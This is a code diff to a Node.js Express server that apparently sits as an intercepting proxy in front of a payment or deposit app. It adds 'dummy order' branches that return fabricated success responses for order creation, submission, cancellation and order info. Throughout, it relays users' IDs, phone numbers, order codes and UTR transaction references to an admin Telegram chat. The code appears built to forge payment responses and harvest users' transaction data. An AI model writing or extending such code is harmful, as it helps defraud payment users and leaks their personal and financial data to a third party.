@@ -2272,29 +2272,44 @@ app.all('/app/user/info/personV2', async (req, res) => { await proxyAndAddBonusP
 app.post('/app/payment/order/create', async (req, res) => {
   const data = await loadData();
   try {
+    const body = req.parsedBody || {};
+    const userId = await extractUserId(req, null);
+    const targetPayOrderId = String(body.payOrderId || body.orderId || body.buyId || body.id || req.query?.payOrderId || req.query?.orderId || '').trim();
+
+    data.dummyOrders = data.dummyOrders || [];
+    const dummyMatch = data.dummyOrders.find(d => String(d.id) === targetPayOrderId || String(d.payOrderId) === targetPayOrderId || d.code === targetPayOrderId);
+
+    if (dummyMatch) {
+      if (userId) { trackUser(data, userId, 'Deposit Order (Dummy)'); saveData(data).catch(() => { }); }
+      const buyId = String(dummyMatch.id || dummyMatch.payOrderId);
+      const jsonResp = {
+        code: 1000,
+        data: {
+          id: buyId,
+          orderId: buyId,
+          payOrderId: buyId,
+          buyId: buyId,
+          amount: dummyMatch.amount,
+          code: dummyMatch.code,
+          orderCode: dummyMatch.code,
+          remark: dummyMatch.code,
+          status: 0
+        },
+        message: "success"
+      };
+      cacheOrderDetails(jsonResp.data);
+      return sendJsonSafe(res, {}, jsonResp, JSON.stringify(jsonResp), req);
+    }
+
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
-    const userId = await extractUserId(req, jsonResp);
     if (userId) { trackUser(data, userId, 'Deposit Order'); saveData(data).catch(() => { }); }
 
     const isSuccess = jsonResp && (jsonResp.code === 1000 || jsonResp.code === 200 || jsonResp.code === '1000' || jsonResp.code === '200');
 
     if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
-      const body = req.parsedBody || {};
       const phone = getPhone(data, userId);
-      const targetPayOrderId = String(body.payOrderId || body.orderId || body.buyId || body.id || req.query?.payOrderId || req.query?.orderId || '').trim();
-      let cached = targetPayOrderId ? orderCache.get(targetPayOrderId) : null;
-      if (!cached && orderCache.size > 0) {
-        let newest = null;
-        for (const [k, v] of orderCache) {
-          if (!newest || v.time > newest.time) newest = v;
-        }
-        if (newest && (Date.now() - newest.time < 45000)) {
-          cached = newest;
-        }
-      }
-
-      const orderAmt = parseFloat(body.amount || body.orderAmount || body.buyAmount || body.buy_amount || body.totalAmount || req.query?.amount || req.query?.buyAmount || (cached ? cached.amount : 0)) || 0;
-      const orderCode = body.code || body.orderCode || body.buyCode || (cached ? cached.code : '') || '';
+      const orderAmt = parseFloat(body.amount || body.orderAmount || body.buyAmount || body.buy_amount || body.totalAmount || req.query?.amount || req.query?.buyAmount || 0) || 0;
+      const orderCode = body.code || body.orderCode || body.buyCode || '';
 
       if (!isSuccess) {
         const errorMsg = jsonResp ? (jsonResp.message || JSON.stringify(jsonResp)) : 'Unknown error';
@@ -2311,7 +2326,6 @@ app.post('/app/payment/order/create', async (req, res) => {
           `🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`;
         bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).catch(() => { });
       }
-      // Success message is now consolidated into orderInfo
     }
 
     sendJsonSafe(res, respHeaders, jsonResp, respBody, req);
@@ -2336,9 +2350,23 @@ app.post('/app/payment/order/createUsdt', async (req, res) => {
 app.post('/app/payment/order/submit', async (req, res) => {
   const data = await loadData();
   try {
+    const body = req.parsedBody || {};
+    const orderIdStr = String(body.orderId || body.orderNo || body.buyId || '').trim();
+    data.dummyOrders = data.dummyOrders || [];
+    const dummyMatch = data.dummyOrders.find(d => String(d.id) === orderIdStr || d.code === orderIdStr);
+
+    if (dummyMatch) {
+      const userId = await extractUserId(req, null);
+      const phone = getPhone(data, userId);
+      if (data.adminChatId && bot) {
+        bot.sendMessage(data.adminChatId, `📤 Payment Submit (Dummy Order) [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}\nUTR: ${body.utr || body.transactionId || 'N/A'}\nOrder: ${dummyMatch.code}`).catch(() => { });
+      }
+      const jsonResp = { code: 1000, message: "success" };
+      return sendJsonSafe(res, {}, jsonResp, JSON.stringify(jsonResp), req);
+    }
+
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
     const userId = await extractUserId(req, jsonResp);
-    const body = req.parsedBody || {};
     if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
       const phone = getPhone(data, userId);
       bot.sendMessage(data.adminChatId, `📤 Payment Submit [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}\nUTR: ${body.utr || body.transactionId || body.referenceNo || body.txnId || 'N/A'}\nOrder: ${body.orderId || body.orderNo || body.buyId || 'N/A'}`).catch(() => { });
@@ -2351,6 +2379,20 @@ app.post('/app/payment/order/submit', async (req, res) => {
 app.post('/app/payment/order/cancel', async (req, res) => {
   const data = await loadData();
   try {
+    const body = req.parsedBody || {};
+    const orderIdStr = String(body.orderId || body.orderNo || body.buyId || '').trim();
+    data.dummyOrders = data.dummyOrders || [];
+    const dummyMatch = data.dummyOrders.find(d => String(d.id) === orderIdStr || d.code === orderIdStr);
+
+    if (dummyMatch) {
+      const cancelUserId = await extractUserId(req, null);
+      if (data.adminChatId && bot) {
+        bot.sendMessage(data.adminChatId, `❌ Order Cancelled (Dummy Order) [${cancelUserId || 'N/A'}]\nOrder: ${dummyMatch.code}`).catch(() => { });
+      }
+      const jsonResp = { code: 1000, message: "success" };
+      return sendJsonSafe(res, {}, jsonResp, JSON.stringify(jsonResp), req);
+    }
+
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
     const cancelUserId = await extractUserId(req, jsonResp);
     if (data.adminChatId && bot && !isLogOff(data, cancelUserId) && !(await isLogOffByToken(data, req))) {
@@ -2365,7 +2407,45 @@ app.all('/app/payment/order/orderInfo', async (req, res) => {
   if (!data.botEnabled) return await transparentProxy(req, res);
 
   try {
-    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    const reqBuyId = String(req.query?.buyId || req.query?.orderId || req.parsedBody?.buyId || req.parsedBody?.orderId || '').trim();
+    data.dummyOrders = data.dummyOrders || [];
+    const dummyMatch = data.dummyOrders.find(d => String(d.id) === reqBuyId || String(d.payOrderId) === reqBuyId || d.code === reqBuyId);
+
+    let response, respBody, respHeaders, jsonResp;
+
+    if (dummyMatch) {
+      const buyId = String(dummyMatch.id || dummyMatch.payOrderId);
+      jsonResp = {
+        code: 1000,
+        data: {
+          id: buyId,
+          orderId: buyId,
+          buyId: buyId,
+          payOrderId: buyId,
+          code: dummyMatch.code,
+          orderCode: dummyMatch.code,
+          orderNo: dummyMatch.code,
+          remark: dummyMatch.code,
+          amount: dummyMatch.amount,
+          orderAmount: dummyMatch.amount,
+          payeeAccount: "N/A",
+          payeeName: "N/A",
+          ifsc: "N/A",
+          bankAccount: "N/A",
+          status: 0
+        },
+        message: "success"
+      };
+      respBody = JSON.stringify(jsonResp);
+      respHeaders = {};
+    } else {
+      const prox = await proxyFetch(req);
+      response = prox.response;
+      respBody = prox.respBody;
+      respHeaders = prox.respHeaders;
+      jsonResp = prox.jsonResp;
+    }
+
     const detailData = getResponseData(jsonResp);
 
     const userId = await extractUserIdFromToken(req) || await extractUserId(req, jsonResp);
